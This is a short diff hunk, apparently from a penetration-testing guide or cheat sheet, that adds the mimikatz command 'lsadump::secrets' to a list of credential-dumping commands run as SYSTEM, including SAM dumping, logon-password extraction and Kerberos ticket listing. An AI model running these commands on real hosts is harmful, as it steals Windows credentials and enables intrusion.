@@ -15,6 +15,8 @@ SID name  : NT AUTHORITY\SYSTEM
 mimikatz # lsadump::sam
 [...]
 
+mimikatz # lsadump::secrets
+
 mimikatz # sekurlsa::logonpasswords
 
 mimikatz # sekurlsa::tickets
